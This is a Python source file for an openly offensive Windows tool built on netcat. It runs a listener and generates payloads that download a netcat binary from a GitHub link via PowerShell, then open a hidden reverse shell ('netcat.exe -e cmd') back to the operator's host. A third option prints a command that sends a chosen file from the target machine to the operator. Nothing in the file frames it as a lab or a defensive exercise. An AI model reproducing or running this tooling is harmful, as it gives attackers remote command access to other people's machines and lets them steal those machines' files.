import os
import subprocess

def get_default_host():
    return runShellCommand('ipconfig | findstr IPv4-Adresse').split(": ")[1].split("\n")[0]

def get_default_port():
    return 9999

def runShellCommand(command):
    return subprocess.check_output(command, shell=True, text=True)

def start_new_listener(host, port):
    print(f"Started new Listener: http://{host}:{port}")
    try:
        os.system(f"start netcat.exe -nlvp {port}")
    except Exception as error:
        print(error)

def generate_target_payload(host, port, download):
    if download == "y":
        print(f'Netcat Payload with Download:\n\npowershell -Command "Invoke-WebRequest https://github.com/NeikiDev/VMResourcesFiles/blob/main/NetCat_compressed_WinBinary.exe?raw=true -OutFile netcat.exe" & start /min "" netcat.exe -e cmd {host} {port} & exit\n\n')
    else:
        print(f'Netcat Payload:\n\nstart /min "" netcat.exe -e cmd {host} {port} & exit\n\n')

def transfare_files(host, port, file):
    print(f"Starting Listener on port {port}")
    print(f"Payload: netcat.exe -w 3 {host} {port} < {file}")
    os.system(f"netcat.exe -lvp {port} > transfar_output/{file}")

def check_if_all_exist():
    if not os.path.isfile('./netcat.exe'):
        print("The Host netcat.exe is not Present here!\nDownload it from here:https://github.com/NeikiDev/VMResourcesFiles/blob/main/NetCat_compressed_WinBinary.exe")
    elif not os.path.isdir("./transfar_output"):
        os.system('mkdir transfar_output')
        os.system("cls")
        print("Created needed Files!\nSystem is Ready!")
        main()
    else:
        os.system("cls")
        print("System is Ready!")
        main()

def main():
    print("Choose an Option you want to use!")
    print("[1] = Generate Payload")
    print("[2] = Start Listener")
    print("[3] = Share Files Between Host and Target")
    print("[99] = Exit")
    c = input("Type a Number: ")
    if c == "99":
        exit()
    elif c == "1":
        os.system("cls")
        hostc = input(f"Type the Host IP (default={get_default_host()}): ")
        portc = input(f"Type the Port (default={get_default_port()}): ")
        downloadc = input(f"Do you want to include a Download Link to the Target Payload? (y/n): ")
        if not hostc:
            hostc = get_default_host()
        if not portc:
            portc = get_default_port()
        os.system("cls")
        generate_target_payload(hostc, portc, downloadc)
        main()
    elif c == "2":
        os.system("cls")
        hostc = input(f"Type the Host IP you want to listen (default={get_default_host()}): ")
        portc = input(f"Type the Port you want to listen (default={get_default_port()}): ")
        if not hostc:
            hostc = get_default_host()
        if not portc:
            portc = get_default_port()
        os.system("cls")
        start_new_listener(hostc, portc)
        main()
    elif c == "3":
        os.system("cls")
        hostc = input(f"Type the Host IP (default={get_default_host()}): ")
        portc = input(f"Type the Port (default={get_default_port()}): ")
        filec = input(f"Type the File Name you want to get (example=file.txt): ")
        if not hostc:
            hostc = get_default_host()
        if not portc:
            portc = get_default_port()
        if not filec:
            filec = "example.txt"
        os.system("cls")
        transfare_files(hostc, portc, filec)
        main()
    else:
        os.system("cls")
        main()

if __name__ == '__main__':
    check_if_all_exist()